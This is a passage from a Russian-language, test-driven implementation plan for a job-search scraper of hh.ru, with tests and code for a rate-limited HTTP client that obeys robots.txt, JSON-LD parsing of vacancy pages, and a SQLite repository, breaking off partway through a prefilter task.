- `5xx` и таймауты → экспоненциальный backoff, до `max_retries` попыток, затем `FetchFailed`;
- `304` возвращается вызывающему как есть.

- [ ] **Step 1: Написать падающий тест**

Создать `tests/test_http.py`:

```python
import httpx
import pytest
import respx

from hh_search.config.models import HttpConfig
from hh_search.errors import AccessForbidden, FetchFailed, RobotsDisallowed
from hh_search.sources.http import PoliteClient

URL = "https://hh.ru/search/vacancy/rss?text=Yocto"
ROBOTS = "https://hh.ru/robots.txt"


def make_client(**overrides: object) -> tuple[PoliteClient, list[float]]:
    slept: list[float] = []
    config = HttpConfig(
        delay_between_requests_sec=1.0, timeout_sec=5, max_retries=3, respect_robots=False
    )
    config = config.model_copy(update=overrides)
    return PoliteClient(config, "hh-search/test", sleep=slept.append), slept


@respx.mock
def test_sends_configured_user_agent() -> None:
    route = respx.get(URL).mock(return_value=httpx.Response(200, text="ok"))
    client, _ = make_client()
    with client:
        client.get(URL)
    assert route.calls.last.request.headers["User-Agent"] == "hh-search/test"


@respx.mock
def test_throttles_between_requests() -> None:
    respx.get(URL).mock(return_value=httpx.Response(200, text="ok"))
    client, slept = make_client()
    with client:
        client.get(URL)
        client.get(URL)
    assert any(delay > 0 for delay in slept)


@respx.mock
def test_forbidden_aborts_without_retry() -> None:
    route = respx.get(URL).mock(return_value=httpx.Response(403))
    client, _ = make_client()
    with client, pytest.raises(AccessForbidden):
        client.get(URL)
    assert route.call_count == 1


@respx.mock
def test_retries_on_429_and_honours_retry_after() -> None:
    route = respx.get(URL).mock(
        side_effect=[
            httpx.Response(429, headers={"Retry-After": "7"}),
            httpx.Response(200, text="ok"),
        ]
    )
    client, slept = make_client()
    with client:
        response = client.get(URL)
    assert response.status_code == 200
    assert route.call_count == 2
    assert 7.0 in slept


@respx.mock
def test_gives_up_after_max_retries_on_server_error() -> None:
    route = respx.get(URL).mock(return_value=httpx.Response(503))
    client, _ = make_client(max_retries=2)
    with client, pytest.raises(FetchFailed):
        client.get(URL)
    assert route.call_count == 2


@respx.mock
def test_passes_conditional_headers_and_returns_304() -> None:
    route = respx.get(URL).mock(return_value=httpx.Response(304))
    client, _ = make_client()
    with client:
        response = client.get(URL, conditional={"If-None-Match": '"abc"'})
    assert response.status_code == 304
    assert route.calls.last.request.headers["If-None-Match"] == '"abc"'


@respx.mock
def test_respects_robots_disallow() -> None:
    respx.get(ROBOTS).mock(
        return_value=httpx.Response(200, text="User-agent: *\nDisallow: /search/\n")
    )
    client, _ = make_client(respect_robots=True)
    with client, pytest.raises(RobotsDisallowed):
        client.get(URL)
```

- [ ] **Step 2: Запустить тест и убедиться, что он падает**

Run: `uv run pytest tests/test_http.py -v`
Expected: FAIL с `ModuleNotFoundError: No module named 'hh_search.errors'`

- [ ] **Step 3: Реализовать `hh_search/errors.py`**

```python
class HhSearchError(Exception):
    """Базовая ошибка приложения."""


class AccessForbidden(HhSearchError):
    """Источник ответил 403. Прогон останавливается, обходить запрет нельзя."""


class FetchFailed(HhSearchError):
    """Не удалось получить ресурс после всех повторов."""


class RobotsDisallowed(HhSearchError):
    """robots.txt запрещает обращение к этому пути."""
```

- [ ] **Step 4: Реализовать `hh_search/sources/http.py`**

```python
import logging
import time
from collections.abc import Callable
from types import TracebackType
from urllib.parse import urlsplit
from urllib.robotparser import RobotFileParser

import httpx

from hh_search.config.models import HttpConfig
from hh_search.errors import AccessForbidden, FetchFailed, RobotsDisallowed

logger = logging.getLogger(__name__)

RETRYABLE_STATUSES = frozenset({429, 500, 502, 503, 504})


class PoliteClient:
    """HTTP-клиент, соблюдающий robots.txt, паузы между запросами и Retry-After."""

    def __init__(
        self,
        config: HttpConfig,
        user_agent: str,
        sleep: Callable[[float], None] = time.sleep,
        transport: httpx.BaseTransport | None = None,
    ) -> None:
        self._config = config
        self._user_agent = user_agent
        self._sleep = sleep
        self._client = httpx.Client(
            headers={"User-Agent": user_agent},
            timeout=config.timeout_sec,
            follow_redirects=True,
            transport=transport,
        )
        self._last_request_at: float | None = None
        self._robots: RobotFileParser | None = None

    def __enter__(self) -> "PoliteClient":
        return self

    def __exit__(
        self,
        exc_type: type[BaseException] | None,
        exc: BaseException | None,
        tb: TracebackType | None,
    ) -> None:
        self.close()

    def close(self) -> None:
        self._client.close()

    def get(self, url: str, conditional: dict[str, str] | None = None) -> httpx.Response:
        self._check_robots(url)
        last_error: Exception | None = None
        for attempt in range(self._config.max_retries):
            self._throttle()
            try:
                response = self._client.get(url, headers=conditional or {})
            except httpx.HTTPError as error:
                last_error = error
                self._backoff(attempt)
                continue

            if response.status_code == 403:
                raise AccessForbidden(
                    f"hh.ru ответил 403 на {url}. Возможно, источник закрыли. "
                    "Прогон остановлен, обходные пути не применяются."
                )
            if response.status_code not in RETRYABLE_STATUSES:
                return response

            last_error = FetchFailed(f"{response.status_code} на {url}")
            self._backoff(attempt, response.headers.get("Retry-After"))

        raise FetchFailed(f"не удалось получить {url}: {last_error}")

    def _throttle(self) -> None:
        if self._last_request_at is None:
            self._last_request_at = time.monotonic()
            return
        elapsed = time.monotonic() - self._last_request_at
        remaining = self._config.delay_between_requests_sec - elapsed
        if remaining > 0:
            self._sleep(remaining)
        self._last_request_at = time.monotonic()

    def _backoff(self, attempt: int, retry_after: str | None = None) -> None:
        if retry_after and retry_after.strip().isdigit():
            self._sleep(float(retry_after.strip()))
            return
        self._sleep(self._config.delay_between_requests_sec * (2**attempt))

    def _check_robots(self, url: str) -> None:
        if not self._config.respect_robots:
            return
        if self._robots is None:
            self._robots = self._load_robots(url)
        if not self._robots.can_fetch(self._user_agent, url):
            raise RobotsDisallowed(f"robots.txt запрещает {url}")

    def _load_robots(self, url: str) -> RobotFileParser:
        parts = urlsplit(url)
        parser = RobotFileParser()
        try:
            response = self._client.get(f"{parts.scheme}://{parts.netloc}/robots.txt")
            parser.parse(response.text.splitlines() if response.status_code == 200 else [])
        except httpx.HTTPError:
            logger.warning("robots.txt недоступен, считаем что ограничений нет")
            parser.parse([])
        return parser
```

- [ ] **Step 5: Запустить тесты и убедиться, что они проходят**

Run: `uv run pytest tests/test_http.py -v && uv run mypy hh_search`
Expected: 7 passed

- [ ] **Step 6: Коммит**

```bash
git add hh_search/errors.py hh_search/sources/http.py tests/test_http.py
git commit -m "feat: вежливый HTTP-клиент

Соблюдение robots.txt, пауза между запросами, Retry-After и
экспоненциальный backoff. 403 не ретраится и роняет прогон —
обходить блокировку нельзя по требованиям спеки."
```

---

### Task 5: Извлечение JSON-LD со страницы вакансии

**Files:**
- Create: `hh_search/sources/vacancy_page.py`
- Create: `tests/fixtures/vacancy.html.gz`
- Test: `tests/test_vacancy_page.py`

**Interfaces:**
- Consumes: `VacancyDetails` из Task 3
- Produces: `extract_job_posting(html: str) -> dict[str, Any] | None`, `html_to_text(html: str) -> str`, `parse_vacancy_page(html: str) -> VacancyDetails` (бросает `FetchFailed`, если `JobPosting` не найден), `vacancy_url(vacancy_id: str) -> str`

- [ ] **Step 1: Сохранить фикстуру страницы вакансии**

Страница весит ~770 КБ, поэтому кладём её в репозиторий сжатой.

```bash
curl -s -H "User-Agent: hh-search/0.1 (fixture capture)" \
  "https://hh.ru/vacancy/135586311" | gzip -9 > tests/fixtures/vacancy.html.gz
python -c "
import gzip
html = gzip.open('tests/fixtures/vacancy.html.gz','rt',encoding='utf-8').read()
assert 'application/ld+json' in html and 'JobPosting' in html
print('ok', len(html), 'символов')
"
```

Если вакансия уже удалена, возьмите любой живой id из `tests/fixtures/rss_yocto.xml`.

- [ ] **Step 2: Написать падающий тест**

Создать `tests/test_vacancy_page.py`:

```python
import gzip
from pathlib import Path

import pytest

from hh_search.errors import FetchFailed
from hh_search.sources.vacancy_page import (
    extract_job_posting,
    html_to_text,
    parse_vacancy_page,
    vacancy_url,
)

FIXTURE = Path(__file__).parent / "fixtures" / "vacancy.html.gz"


def load_fixture() -> str:
    with gzip.open(FIXTURE, "rt", encoding="utf-8") as handle:
        return handle.read()


def test_extracts_job_posting_from_real_page() -> None:
    posting = extract_job_posting(load_fixture())
    assert posting is not None
    assert posting["@type"] == "JobPosting"
    assert posting["title"]
    assert posting["description"]


def test_parse_vacancy_page_returns_plain_text_description() -> None:
    details = parse_vacancy_page(load_fixture())
    assert details.description
    assert "<p>" not in details.description
    assert "&nbsp;" not in details.description


def test_parse_vacancy_page_raises_when_json_ld_is_missing() -> None:
    with pytest.raises(FetchFailed):
        parse_vacancy_page("<html><body>ничего полезного</body></html>")


def test_extract_job_posting_skips_other_ld_json_blocks() -> None:
    html = (
        '<script type="application/ld+json">{"@type": "Organization"}</script>'
        '<script type="application/ld+json">{"@type": "JobPosting", '
        '"title": "Инженер", "description": "<p>текст</p>"}</script>'
    )
    posting = extract_job_posting(html)
    assert posting is not None
    assert posting["title"] == "Инженер"


def test_extract_job_posting_tolerates_malformed_block() -> None:
    html = (
        '<script type="application/ld+json">{ битый json </script>'
        '<script type="application/ld+json">{"@type": "JobPosting", "description": "ок"}</script>'
    )
    posting = extract_job_posting(html)
    assert posting is not None
    assert posting["description"] == "ок"


def test_html_to_text_unescapes_and_keeps_line_breaks() -> None:
    text = html_to_text("<p>Задачи:</p><ul><li>C++&nbsp;&amp; Linux</li><li>Yocto</li></ul>")
    assert "C++ & Linux" in text
    assert "Yocto" in text
    assert "<" not in text


def test_vacancy_url_is_built_from_id() -> None:
    assert vacancy_url("135586311") == "https://hh.ru/vacancy/135586311"
```

- [ ] **Step 3: Запустить тест и убедиться, что он падает**

Run: `uv run pytest tests/test_vacancy_page.py -v`
Expected: FAIL с `ModuleNotFoundError: No module named 'hh_search.sources.vacancy_page'`

- [ ] **Step 4: Реализовать `hh_search/sources/vacancy_page.py`**

```python
import json
import re
from datetime import datetime
from html import unescape
from typing import Any

from hh_search.domain.models import VacancyDetails
from hh_search.errors import FetchFailed

_LD_JSON_RE = re.compile(
    r'<script[^>]*type="application/ld\+json"[^>]*>(.*?)</script>', re.DOTALL | re.IGNORECASE
)
_BLOCK_END_RE = re.compile(r"</(p|div|li|ul|ol|h[1-6])>|<br\s*/?>", re.IGNORECASE)
_TAG_RE = re.compile(r"<[^>]+>")
_SPACES_RE = re.compile(r"[ \t ]+")
_BLANK_LINES_RE = re.compile(r"\n{3,}")


def vacancy_url(vacancy_id: str) -> str:
    return f"https://hh.ru/vacancy/{vacancy_id}"


def extract_job_posting(html: str) -> dict[str, Any] | None:
    """Находит блок JSON-LD с типом JobPosting. Битые блоки пропускает."""
    for block in _LD_JSON_RE.findall(html):
        try:
            data = json.loads(block)
        except json.JSONDecodeError:
            continue
        if isinstance(data, dict) and data.get("@type") == "JobPosting":
            return data
    return None


def html_to_text(html: str) -> str:
    text = _BLOCK_END_RE.sub("\n", html)
    text = _TAG_RE.sub("", text)
    text = unescape(text)
    text = _SPACES_RE.sub(" ", text)
    text = "\n".join(line.strip() for line in text.splitlines())
    return _BLANK_LINES_RE.sub("\n\n", text).strip()


def _parse_datetime(value: Any) -> datetime | None:
    if not isinstance(value, str):
        return None
    try:
        return datetime.fromisoformat(value)
    except ValueError:
        return None


def _extract_locality(posting: dict[str, Any]) -> str | None:
    location = posting.get("jobLocation")
    if not isinstance(location, dict):
        return None
    address = location.get("address")
    if not isinstance(address, dict):
        return None
    locality = address.get("addressLocality")
    return locality if isinstance(locality, str) else None


def parse_vacancy_page(html: str) -> VacancyDetails:
    posting = extract_job_posting(html)
    if posting is None:
        raise FetchFailed("на странице нет блока JSON-LD с JobPosting")
    return VacancyDetails(
        description=html_to_text(str(posting.get("description", ""))),
        valid_through=_parse_datetime(posting.get("validThrough")),
        location=_extract_locality(posting),
    )
```

- [ ] **Step 5: Запустить тесты и убедиться, что они проходят**

Run: `uv run pytest tests/test_vacancy_page.py -v && uv run mypy hh_search`
Expected: 7 passed

- [ ] **Step 6: Коммит**

```bash
git add hh_search/sources/vacancy_page.py tests/test_vacancy_page.py tests/fixtures
git commit -m "feat: извлечение JSON-LD со страницы вакансии

Берём структурированный JobPosting, а не вёрстку — устойчивее к
редизайну. Битые блоки ld+json пропускаются, отсутствие JobPosting
поднимает FetchFailed, что на уровне конвейера превращается в
повторную попытку. Фикстура живой страницы лежит сжатой."
```

---

### Task 6: Хранилище

**Files:**
- Create: `hh_search/storage/__init__.py`, `hh_search/storage/schema.sql`, `hh_search/storage/repository.py`
- Test: `tests/test_repository.py`

**Interfaces:**
- Consumes: `DiscoveredVacancy`, `VacancyDetails`, `ScoreBreakdown`, `ScoredVacancy` из Task 3
- Produces: `class SqliteRepository(path: Path | str)` с методами:
  - `init_schema() -> None`
  - `close() -> None`, поддержка контекстного менеджера
  - `known_ids(ids: Iterable[str]) -> set[str]`
  - `add_discovered(vacancy: DiscoveredVacancy, cluster: str, weight: int) -> bool` — возвращает `True`, если вакансия новая; при повторном обнаружении другим запросом только дописывает связь в `vacancy_query` и, если новый запрос весомее, переписывает кластер
  - `mark_rejected(vacancy_id: str, reason: str) -> None`
  - `pending_enrichment(max_attempts: int) -> list[DiscoveredVacancy]`
  - `save_details(vacancy_id: str, details: VacancyDetails) -> None`
  - `bump_enrich_attempt(vacancy_id: str) -> int` — возвращает новое значение счётчика
  - `save_score(vacancy_id: str, score: ScoreBreakdown) -> None`
  - `unreported() -> list[ScoredVacancy]`
  - `mark_reported(ids: Sequence[str]) -> None`
  - `set_status(vacancy_id: str, status: str) -> None`
  - `start_run() -> int`, `finish_run(run_id: int, status: str, finished_at: datetime | None = None, **counters: int | str | None) -> None` — `finished_at` по умолчанию «сейчас»; явное значение нужно тестам и делает поведение детерминированным
  - `last_successful_run() -> datetime | None`
  - `cache_headers(url: str) -> dict[str, str]`, `save_cache_headers(url: str, etag: str | None, last_modified: str | None) -> None`

> **Отклонение от спеки, зафиксировать:** в §5.1 нет таблицы `http_cache`, но §3.5 требует условных запросов. Таблица добавлена здесь; спека будет обновлена в Task 13.

- [ ] **Step 1: Написать падающий тест**

Создать `tests/test_repository.py`:

```python
from datetime import datetime

import pytest

from hh_search.domain.models import DiscoveredVacancy, Salary, ScoreBreakdown, VacancyDetails
from hh_search.storage.repository import SqliteRepository


@pytest.fixture()
def repo() -> SqliteRepository:
    repository = SqliteRepository(":memory:")
    repository.init_schema()
    return repository


def make_vacancy(vacancy_id: str = "1", query: str = "Yocto") -> DiscoveredVacancy:
    return DiscoveredVacancy(
        id=vacancy_id,
        url=f"https://hh.ru/vacancy/{vacancy_id}",
        title="Embedded Linux Engineer",
        company="ООО Ромашка",
        area="Нижний Новгород",
        salary=Salary(raw="от 200 000 руб.", amount_from=200000, currency="руб."),
        published_at=datetime(2026, 7, 27, 9, 0, 0),
        found_by_query=query,
    )


def make_score(total: float = 87.4) -> ScoreBreakdown:
    return ScoreBreakdown(
        title=1.0,
        stack=0.8,
        responsibilities=0.67,
        domain=1.0,
        penalty=0.0,
        total=total,
        matched={"stack": ["Yocto"]},
    )


def test_add_discovered_reports_new_only_once(repo: SqliteRepository) -> None:
    assert repo.add_discovered(make_vacancy(), "embedded", 9) is True
    assert repo.add_discovered(make_vacancy(), "embedded", 9) is False


def test_known_ids_returns_only_stored(repo: SqliteRepository) -> None:
    repo.add_discovered(make_vacancy("1"), "embedded", 9)
    assert repo.known_ids(["1", "2"]) == {"1"}


def test_heavier_query_wins_the_cluster(repo: SqliteRepository) -> None:
    repo.add_discovered(make_vacancy("1", "Yocto"), "embedded", 5)
    repo.add_discovered(make_vacancy("1", "Backend Team Lead"), "backend", 10)
    repo.save_details("1", VacancyDetails(description="текст"))
    repo.save_score("1", make_score())
    assert repo.unreported()[0].cluster == "backend"


def test_rejected_vacancy_is_not_offered_for_enrichment(repo: SqliteRepository) -> None:
    repo.add_discovered(make_vacancy(), "embedded", 9)
    repo.mark_rejected("1", "stop-word in title")
    assert repo.pending_enrichment(max_attempts=3) == []


def test_pending_enrichment_skips_exhausted_attempts(repo: SqliteRepository) -> None:
    repo.add_discovered(make_vacancy(), "embedded", 9)
    for _ in range(3):
        repo.bump_enrich_attempt("1")
    assert repo.pending_enrichment(max_attempts=3) == []


def test_enriched_and_scored_vacancy_becomes_unreported(repo: SqliteRepository) -> None:
    repo.add_discovered(make_vacancy(), "embedded", 9)
    repo.save_details("1", VacancyDetails(description="Требуется Yocto"))
    repo.save_score("1", make_score())
    pending = repo.unreported()
    assert len(pending) == 1
    assert pending[0].score.total == 87.4
    assert pending[0].discovered.salary.amount_from == 200000


def test_mark_reported_empties_the_queue(repo: SqliteRepository) -> None:
    repo.add_discovered(make_vacancy(), "embedded", 9)
    repo.save_details("1", VacancyDetails(description="текст"))
    repo.save_score("1", make_score())
    repo.mark_reported(["1"])
    assert repo.unreported() == []


def test_run_journal_tracks_last_success(repo: SqliteRepository) -> None:
    assert repo.last_successful_run() is None
    run_id = repo.start_run()
    repo.finish_run(run_id, "ok", discovered=20, new_count=2)
    assert isinstance(repo.last_successful_run(), datetime)


def test_failed_run_does_not_count_as_success(repo: SqliteRepository) -> None:
    run_id = repo.start_run()
    repo.finish_run(run_id, "failed", error="403")
    assert repo.last_successful_run() is None


def test_cache_headers_round_trip(repo: SqliteRepository) -> None:
    assert repo.cache_headers("https://hh.ru/x") == {}
    repo.save_cache_headers("https://hh.ru/x", etag='"abc"', last_modified=None)
    assert repo.cache_headers("https://hh.ru/x") == {"If-None-Match": '"abc"'}
```

- [ ] **Step 2: Запустить тест и убедиться, что он падает**

Run: `uv run pytest tests/test_repository.py -v`
Expected: FAIL с `ModuleNotFoundError: No module named 'hh_search.storage'`

- [ ] **Step 3: Создать `hh_search/storage/schema.sql`**

```sql
CREATE TABLE IF NOT EXISTS vacancy (
    id              TEXT PRIMARY KEY,
    url             TEXT NOT NULL,
    title           TEXT NOT NULL,
    company         TEXT,
    area            TEXT,
    salary_raw      TEXT,
    salary_from     INTEGER,
    salary_to       INTEGER,
    salary_currency TEXT,
    published_at    TEXT NOT NULL,
    description     TEXT,
    fetched_at      TEXT,
    enrich_attempts INTEGER NOT NULL DEFAULT 0,
    score           REAL,
    score_detail    TEXT,
    cluster         TEXT,
    cluster_weight  INTEGER NOT NULL DEFAULT 0,
    status          TEXT NOT NULL,
    reject_reason   TEXT,
    first_seen_at   TEXT NOT NULL,
    reported_at     TEXT
);

CREATE INDEX IF NOT EXISTS idx_vacancy_status ON vacancy(status);

CREATE TABLE IF NOT EXISTS vacancy_query (
    vacancy_id TEXT NOT NULL REFERENCES vacancy(id),
    query      TEXT NOT NULL,
    PRIMARY KEY (vacancy_id, query)
);

CREATE TABLE IF NOT EXISTS run (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    started_at  TEXT NOT NULL,
    finished_at TEXT,
    status      TEXT NOT NULL,
    discovered  INTEGER DEFAULT 0,
    new_count   INTEGER DEFAULT 0,
    rejected    INTEGER DEFAULT 0,
    enriched    INTEGER DEFAULT 0,
    reported    INTEGER DEFAULT 0,
    error       TEXT
);

CREATE TABLE IF NOT EXISTS http_cache (
    url           TEXT PRIMARY KEY,
    etag          TEXT,
    last_modified TEXT,
    fetched_at    TEXT NOT NULL
);
```

- [ ] **Step 4: Реализовать `hh_search/storage/repository.py`**

```python
import json
import sqlite3
from collections.abc import Iterable, Sequence
from datetime import UTC, datetime
from pathlib import Path
from types import TracebackType

from hh_search.domain.models import (
    DiscoveredVacancy,
    Salary,
    ScoreBreakdown,
    ScoredVacancy,
    VacancyDetails,
)

SCHEMA_PATH = Path(__file__).parent / "schema.sql"

STATUS_NEW = "new"
STATUS_REJECTED = "rejected"
STATUS_REPORTED = "reported"


def _now() -> str:
    return datetime.now(UTC).isoformat()


class SqliteRepository:
    """Единственное место в проекте, где живёт SQL."""

    def __init__(self, path: Path | str) -> None:
        self._connection = sqlite3.connect(str(path))
        self._connection.row_factory = sqlite3.Row
        self._connection.execute("PRAGMA foreign_keys = ON")

    def __enter__(self) -> "SqliteRepository":
        return self

    def __exit__(
        self,
        exc_type: type[BaseException] | None,
        exc: BaseException | None,
        tb: TracebackType | None,
    ) -> None:
        self.close()

    def close(self) -> None:
        self._connection.close()

    def init_schema(self) -> None:
        self._connection.executescript(SCHEMA_PATH.read_text(encoding="utf-8"))
        self._connection.commit()

    # --- discovery -----------------------------------------------------

    def known_ids(self, ids: Iterable[str]) -> set[str]:
        wanted = list(ids)
        if not wanted:
            return set()
        placeholders = ",".join("?" * len(wanted))
        rows = self._connection.execute(
            f"SELECT id FROM vacancy WHERE id IN ({placeholders})", wanted
        )
        return {row["id"] for row in rows}

    def add_discovered(self, vacancy: DiscoveredVacancy, cluster: str, weight: int) -> bool:
        cursor = self._connection.execute(
            """
            INSERT INTO vacancy (id, url, title, company, area, salary_raw, salary_from,
                                 salary_to, salary_currency, published_at, status,
                                 cluster, cluster_weight, first_seen_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ON CONFLICT(id) DO NOTHING
            """,
            (
                vacancy.id,
                vacancy.url,
                vacancy.title,
                vacancy.company,
                vacancy.area,
                vacancy.salary.raw,
                vacancy.salary.amount_from,
                vacancy.salary.amount_to,
                vacancy.salary.currency,
                vacancy.published_at.isoformat(),
                STATUS_NEW,
                cluster,
                weight,
                _now(),
            ),
        )
        is_new = cursor.rowcount > 0
        self._connection.execute(
            "INSERT OR IGNORE INTO vacancy_query (vacancy_id, query) VALUES (?, ?)",
            (vacancy.id, vacancy.found_by_query),
        )
        if not is_new:
            self._connection.execute(
                "UPDATE vacancy SET cluster = ?, cluster_weight = ? "
                "WHERE id = ? AND cluster_weight < ?",
                (cluster, weight, vacancy.id, weight),
            )
        self._connection.commit()
        return is_new

    def mark_rejected(self, vacancy_id: str, reason: str) -> None:
        self._connection.execute(
            "UPDATE vacancy SET status = ?, reject_reason = ? WHERE id = ?",
            (STATUS_REJECTED, reason, vacancy_id),
        )
        self._connection.commit()

    def set_status(self, vacancy_id: str, status: str) -> None:
        self._connection.execute(
            "UPDATE vacancy SET status = ? WHERE id = ?", (status, vacancy_id)
        )
        self._connection.commit()

    # --- enrichment ----------------------------------------------------

    def pending_enrichment(self, max_attempts: int) -> list[DiscoveredVacancy]:
        rows = self._connection.execute(
            """
            SELECT v.*, (SELECT query FROM vacancy_query q WHERE q.vacancy_id = v.id LIMIT 1)
                   AS found_by_query
            FROM vacancy v
            WHERE v.status = ? AND v.description IS NULL AND v.enrich_attempts < ?
            ORDER BY v.published_at DESC
            """,
            (STATUS_NEW, max_attempts),
        ).fetchall()
        return [self._to_discovered(row) for row in rows]

    def save_details(self, vacancy_id: str, details: VacancyDetails) -> None:
        self._connection.execute(
            "UPDATE vacancy SET description = ?, fetched_at = ? WHERE id = ?",
            (details.description, _now(), vacancy_id),
        )
        self._connection.commit()

    def bump_enrich_attempt(self, vacancy_id: str) -> int:
        self._connection.execute(
            "UPDATE vacancy SET enrich_attempts = enrich_attempts + 1 WHERE id = ?", (vacancy_id,)
        )
        self._connection.commit()
        row = self._connection.execute(
            "SELECT enrich_attempts FROM vacancy WHERE id = ?", (vacancy_id,)
        ).fetchone()
        return int(row["enrich_attempts"]) if row else 0

    # --- scoring and reporting -----------------------------------------

    def save_score(self, vacancy_id: str, score: ScoreBreakdown) -> None:
        self._connection.execute(
            "UPDATE vacancy SET score = ?, score_detail = ? WHERE id = ?",
            (score.total, score.model_dump_json(), vacancy_id),
        )
        self._connection.commit()

    def unreported(self) -> list[ScoredVacancy]:
        rows = self._connection.execute(
            """
            SELECT v.*, (SELECT query FROM vacancy_query q WHERE q.vacancy_id = v.id LIMIT 1)
                   AS found_by_query
            FROM vacancy v
            WHERE v.status = ? AND v.score IS NOT NULL AND v.description IS NOT NULL
            ORDER BY v.score DESC
            """,
            (STATUS_NEW,),
        ).fetchall()
        return [
            ScoredVacancy(
                discovered=self._to_discovered(row),
                details=VacancyDetails(description=row["description"]),
                score=ScoreBreakdown.model_validate(json.loads(row["score_detail"])),
                cluster=row["cluster"] or "",
            )
            for row in rows
        ]

    def mark_reported(self, ids: Sequence[str]) -> None:
        if not ids:
            return
        self._connection.executemany(
            "UPDATE vacancy SET status = ?, reported_at = ? WHERE id = ?",
            [(STATUS_REPORTED, _now(), vacancy_id) for vacancy_id in ids],
        )
        self._connection.commit()

    # --- run journal ---------------------------------------------------

    def start_run(self) -> int:
        cursor = self._connection.execute(
            "INSERT INTO run (started_at, status) VALUES (?, 'running')", (_now(),)
        )
        self._connection.commit()
        return int(cursor.lastrowid or 0)

    def finish_run(
        self,
        run_id: int,
        status: str,
        finished_at: datetime | None = None,
        **counters: int | str | None,
    ) -> None:
        allowed = {"discovered", "new_count", "rejected", "enriched", "reported", "error"}
        fields = {name: value for name, value in counters.items() if name in allowed}
        assignments = ", ".join(f"{name} = ?" for name in fields)
        prefix = f"{assignments}, " if assignments else ""
        moment = (finished_at or datetime.now(UTC)).isoformat()
        self._connection.execute(
            f"UPDATE run SET {prefix}status = ?, finished_at = ? WHERE id = ?",
            (*fields.values(), status, moment, run_id),
        )
        self._connection.commit()

    def last_successful_run(self) -> datetime | None:
        row = self._connection.execute(
            "SELECT finished_at FROM run WHERE status IN ('ok', 'partial') "
            "AND finished_at IS NOT NULL ORDER BY finished_at DESC LIMIT 1"
        ).fetchone()
        return datetime.fromisoformat(row["finished_at"]) if row else None

    # --- conditional requests ------------------------------------------

    def cache_headers(self, url: str) -> dict[str, str]:
        row = self._connection.execute(
            "SELECT etag, last_modified FROM http_cache WHERE url = ?", (url,)
        ).fetchone()
        if row is None:
            return {}
        headers: dict[str, str] = {}
        if row["etag"]:
            headers["If-None-Match"] = row["etag"]
        if row["last_modified"]:
            headers["If-Modified-Since"] = row["last_modified"]
        return headers

    def save_cache_headers(self, url: str, etag: str | None, last_modified: str | None) -> None:
        if etag is None and last_modified is None:
            return
        self._connection.execute(
            "INSERT INTO http_cache (url, etag, last_modified, fetched_at) VALUES (?, ?, ?, ?) "
            "ON CONFLICT(url) DO UPDATE SET etag = excluded.etag, "
            "last_modified = excluded.last_modified, fetched_at = excluded.fetched_at",
            (url, etag, last_modified, _now()),
        )
        self._connection.commit()

    # --- helpers -------------------------------------------------------

    @staticmethod
    def _to_discovered(row: sqlite3.Row) -> DiscoveredVacancy:
        return DiscoveredVacancy(
            id=row["id"],
            url=row["url"],
            title=row["title"],
            company=row["company"],
            area=row["area"],
            salary=Salary(
                raw=row["salary_raw"],
                amount_from=row["salary_from"],
                amount_to=row["salary_to"],
                currency=row["salary_currency"],
            ),
            published_at=datetime.fromisoformat(row["published_at"]),
            found_by_query=row["found_by_query"] or "",
        )
```

Создать пустой `hh_search/storage/__init__.py`. Убедиться, что `schema.sql` попадает в пакет: добавить в `pyproject.toml` секцию

```toml
[tool.hatch.build.targets.wheel.force-include]
"hh_search/storage/schema.sql" = "hh_search/storage/schema.sql"
```

- [ ] **Step 5: Запустить тесты и убедиться, что они проходят**

Run: `uv run pytest tests/test_repository.py -v && uv run mypy hh_search`
Expected: 10 passed

- [ ] **Step 6: Коммит**

```bash
git add hh_search/storage tests/test_repository.py pyproject.toml
git commit -m "feat: хранилище на SQLite

Весь SQL собран в одном модуле — это точка расширения под Postgres.
Кластер вакансии определяется самым весомым запросом, которым она
найдена. Добавлена таблица http_cache для условных запросов из §3.5
спеки, которой не было в §5.1."
```

---

### Task 7: Префильтр

**Files:**
- Create: `hh_search/filtering/prefilter.py`
- Test: `tests/test_prefilter.py`

**Interfaces:**
- Consumes: `SignalMatcher` из Task 2, `DiscoveredVacancy` из Task 3, `ProfileConfig` из Task 1
- Produces: `class Prefilter(profile: ProfileConfig)` с методом `reason_to_reject(vacancy: DiscoveredVacancy) -> str | None` (возвращает причину отказа или `None`, если вакансия проходит дальше)

**Что изменил переезд источника.** Discovery идёт по листингу `/vacancies/{slug}`, а он
отдаёт только id, url и заголовок (спека §3.2). Обещание прежней редакции — «префильтр по
заголовку **и региону**» — больше невыполнимо: региона, компании и зарплаты на этом шаге
физически нет, они приезжают со страницы вакансии, то есть уже после того, как за неё
заплачено запросом. Задача отсеивает по заголовку и только по нему.

**Что здесь дорого.** Ложный отказ — это `status='rejected'` навсегда: вакансия не
вернётся ни следующим прогоном, ни после правки конфига. Пропущенный мусор стоит одного
запроса к hh.ru. Асимметрия и определяет набор тестов: главный из них — на живой фикстуре
листинга, и он проверяет **список выживших целиком**, а не число отказов.

Пустой стоп-сигнал (`SignalMatcher([""])` совпадает почти с любым текстом, а отказ
необратим и с пустой причиной в логе) **уже закрыт** коммитом `e588f4d` — и валидатором
конфига (`Signal` в `config/models.py`), и самим `_compile`. Задача 7 на это опирается и
ничего не изобретает заново; тест остаётся как страховка на самое дорогое.

- [ ] **Step 1: Написать падающий тест**

Создать `tests/test_prefilter.py`:

```python
import gzip
from pathlib import Path

import pytest
from pydantic import ValidationError

from hh_search.config.models import ProfileConfig, Saturation, Signals, Weights
from hh_search.domain.models import DiscoveredVacancy
from hh_search.filtering.matching import SignalMatcher
from hh_search.filtering.prefilter import Prefilter
from hh_search.sources.listing import parse_listing

FIXTURES = Path(__file__).parent / "fixtures"
LIVE_LISTING = "listing_programmist.html.gz"

# Стоп-слова образца profile.yaml из спеки §7 — ровно те, что поедут в прод.
SPEC_NEGATIVE = [
    "junior",
    "стажёр",
    "intern",
    "1c",
    "продаж",
    "рекрутер",
    "ручн тестиров",
    "оператор пк",
    "оператор call",
    "оператор колл",
    "оператор станка",
    "курьер",
]


def make_profile(negative: list[str]) -> ProfileConfig:
    """Профиль, в котором заполнено только то, что читает префильтр.

    Позитивные сигналы намеренно пусты: на шаге 3 они не участвуют вовсе,
    и пустые списки это фиксируют лучше любого комментария.
    """
    return ProfileConfig(
        weights=Weights(title=0.4, stack=0.3, responsibilities=0.2, domain=0.1),
        saturation=Saturation(stack=5, responsibilities=3),
        penalty_per_signal=15,
        signals=Signals(
            title_roles=[],
